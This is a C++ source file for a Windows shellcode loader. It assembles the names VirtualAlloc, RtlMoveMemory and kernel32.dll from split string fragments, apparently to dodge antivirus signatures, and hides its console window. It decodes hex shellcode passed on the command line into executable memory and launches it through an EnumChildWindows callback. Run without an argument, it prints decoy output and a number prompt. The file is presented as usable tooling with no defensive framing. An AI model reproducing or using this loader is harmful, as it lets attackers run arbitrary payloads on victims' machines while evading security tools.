#include <iostream>
#include <windows.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
using namespace std;


unsigned char decodehex(char s[3]) {
	int tmp = 0, tmp1 = 0;
	char result;

	if (s[0] >= '0' && s[0] <= '9') {
		tmp = s[0] - '0';
	}
	if (s[0] >= 'a' && s[0] <= 'f') {
		tmp = s[0] - 'a' + 10;
	}
	if (s[1] >= '0' && s[1] <= '9') {
		tmp1 = s[1] - '0';
	}
	if (s[1] >= 'a' && s[1] <= 'f') {
		tmp1 = s[1] - 'a' + 10;
	}
	result = tmp * 16 + tmp1;
	return result;
}

int main(int argc, char* argv[]) {
	int flag = 0;
	char bb1[16] = "Vi";
	char bb4[5] = "rtua";
	char bb2[8] = "lAl";
	char bb3[4] = "loc";
	char aa1[16] = "RtlMo";
	char aa2[10] = "veMe";
	char aa3[5] = "mory";
	char info[17] = "kern";
	char info1[7] = "el32";
	char ext1[6] = ".d";
	char ext2[2] = "l";
	char ext3[2] = "l";
	strcat(bb1, bb4); strcat(bb2, bb3); strcat(bb1, bb2); strcat(aa2, aa3); strcat(aa1, aa2); strcat(info, info1); strcat(info, ext1); strcat(info, ext2); strcat(info, ext3);
	printf("%s", info);
	if (argc > 1 && flag == 0) {
		typedef void* (WINAPI* V_)(
			LPVOID lpAddress,
			DWORD dwSize,
			DWORD flAllocationType,
			DWORD flProtect
			);
		typedef FARPROC(WINAPI* GetFuncAddr_)(
			HMODULE hmod,
			LPCSTR  lpName
			);
		typedef BOOL(WINAPI* callback_)(
			HWND        hWndParent,
			WNDENUMPROC lpEnumFunc,
			LPARAM      lParam
			);
		typedef VOID(WINAPI* Rt)(
			VOID UNALIGNED* Destination,
			VOID UNALIGNED* Source,
			SIZE_T         Length
			);
		GetFuncAddr_ GetFuncAddr = (GetFuncAddr_)GetProcAddress(
			LoadLibraryA(info),
			"GetProcAddress"
		);
		V_ _VA_ = (V_)GetFuncAddr(
			LoadLibraryA(info),
			bb1
		);
		callback_ loader = (callback_)GetProcAddress(
			LoadLibraryA("user32.dll"),
			"EnumChildWindows"
		);
		Rt m = (Rt)GetProcAddress(
			LoadLibraryA(info),
			aa1
		);
		char* s = argv[1];
		int len = 0;
		char* cur = s;
		while (*(cur++) != '\0') {
			len++;
		}
		unsigned char* buf = new unsigned char[len / 2];
		char tmp[3];
		int count = 0;
		for (int i = 0; i <= len; i += 2) {
			tmp[0] = s[i], tmp[1] = s[i + 1];
			//c = 
			*(buf + count++) = (char)decodehex(tmp);
		}
		DWORD old_protect = 0;
		void* exec = _VA_(0, len / 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		m(exec, buf, count - 1);
		loader(NULL, (WNDENUMPROC)exec, 0);
	}
	else {
		struct  Giao {
			char* name;
			int length;
		};
		struct Giao* giao = (Giao*)malloc(sizeof(Giao));
		giao->name = (char*)malloc(sizeof("666"));
		char k[4] = "666";
		giao->name = k;
		giao->length = 6;

		printf("good good! !:%s\n", giao->name);
		Sleep(5000);
		int n;
		char name[500];
		printf("Please input your number :");
		scanf("%d", &n);
		printf("OH!!!!!!!!!!!!!!!!!!!!!!!!!\n%d", n);

	}
}
